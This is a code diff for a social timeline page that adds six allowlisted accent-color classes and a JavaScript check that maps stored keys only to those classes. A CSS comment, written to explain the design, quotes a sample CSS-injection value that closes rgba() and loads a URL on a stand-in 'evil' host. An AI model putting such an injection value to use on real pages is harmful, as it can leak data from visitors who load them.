@@ -38,7 +38,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Saira+Condensed:wght@900&family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&family=Pirata+One&family=Luckiest+Guy&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js" defer></script>
 <script src="supabase-config.js?v=f1348482" defer></script>
-<script src="assets/js/desk.js?v=e5f8b208" defer></script>
+<script src="assets/js/desk.js?v=128f5421" defer></script>
 <script src="assets/js/door.js?v=cb068ae4" defer></script>
 <script src="assets/js/composer.js?v=51127ffa" defer></script>
 <style>
@@ -2777,6 +2777,32 @@
      and pasting a link is the most likely thing anybody will do here. */
   .post-main{min-width:0;}
   .post-body{overflow-wrap:anywhere;}
+
+  /* ===== SEAT ACCENTS =====
+     THE RULE: the database stores a KEY like 'gold'. These six rules are the
+     ONLY place on this page where an accent hex exists. Nothing in JS ever
+     builds, stores or interpolates a color. If you are ever tempted to write
+     style="--acc:${x}", stop: --acc-rgb is consumed inside rgba(), so a value
+     like `0,0,0);background:url(https://evil/?c=` would close the rgba() and
+     inject a declaration into a page strangers load.
+     The bare .post-t line is the fallback: a post with no acc- class renders
+     byte-identical to how the site looked before accents existed. */
+  .post-t{--acc:var(--pink-glow);--acc-rgb:255,121,198;}
+  .post-t.acc-acid  {--acc:#a3e635;--acc-rgb:163,230,53;}
+  .post-t.acc-gold  {--acc:#ffd479;--acc-rgb:255,212,121;}
+  .post-t.acc-ember {--acc:#ff8a5c;--acc-rgb:255,138,92;}
+  .post-t.acc-pink  {--acc:#ff79c6;--acc-rgb:255,121,198;}
+  .post-t.acc-violet{--acc:#c084fc;--acc-rgb:192,132,252;}
+  .post-t.acc-ice   {--acc:#a0e6ff;--acc-rgb:160,230,255;}
+
+  /* The accent reaches four things and stops. Every selector is prefixed
+     .post-t so it physically cannot leak out of the timeline. */
+  .post-t .av{border:2px solid var(--acc);}          /* the scan cue, solid on purpose */
+  .post-t .post-who .seat{color:var(--acc);border-color:rgba(var(--acc-rgb),.6);}
+  .post-t:hover{background:rgba(var(--acc-rgb),.05);}
+  .post-t .post-body em{color:var(--acc);}
+  .post-t .av-fallback{color:var(--acc);}
+  /* PINNED stays dye-blue: it is a desk state, not an identity. */
   .post-t{
     display:grid;grid-template-columns:52px 1fr;gap:12px;
     padding:16px 4px;border-bottom:1px solid var(--line);
@@ -3396,6 +3422,11 @@
       ? [pinnedPost, ...take.filter(p => p !== pinnedPost)]
       : take).slice(0, FEED_CAP);
 
+    // The key is matched against a frozen list. An unknown or missing value
+    // falls through to no class at all, which renders as house pink.
+    const ACCENTS = ['acid','gold','ember','pink','violet','ice'];
+    const accClass = v => ACCENTS.indexOf(String(v || '')) !== -1 ? ' acc-' + v : '';
+
     tMount.innerHTML = visible.map((p, i) => {
       const who = cardPeople[slugify(p.author || '')] || {
         name: p.author_name || p.author || 'THE DESK',
@@ -3422,7 +3453,8 @@
           : `<a class="post-img" href="${esc(imgUrl)}" target="_blank" rel="noopener">
                <img src="${esc(imgUrl)}" alt="${esc(p.image_alt || '')}" loading="lazy" decoding="async"></a>`;
       const pin = p.pinned ? `<span class="pin">PINNED</span>` : '';
-      return `<article class="post-t${p.pinned ? ' pinned' : ''}">
+      // live post's own accent, else the accent sitting on their card, else house
+      return `<article class="post-t${p.pinned ? ' pinned' : ''}${accClass(p.accent || who.accent)}">
         <a class="post-av" href="${esc(safeUrl(who.link) || '#')}" ${isExt ? 'target="_blank" rel="noopener"' : ''}>${av}</a>
         <div class="post-main">
           <div class="post-who">
